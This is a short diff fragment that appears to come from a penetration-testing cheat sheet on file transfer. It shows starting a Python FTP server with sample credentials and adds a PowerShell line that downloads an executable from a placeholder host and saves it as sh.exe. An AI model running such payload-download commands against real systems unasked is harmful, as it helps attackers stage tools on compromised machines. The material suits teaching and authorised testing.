@@ -112,7 +112,7 @@ python3 -m pyftpdlib -w -p 21 -u ignite -P 123
 				get ignite.txt
 				put C:\Users\raj\avni.txt
 
-
+iwr -uri http://<ip_address>/file.exe -outfile sh.exe
 ```
 
 
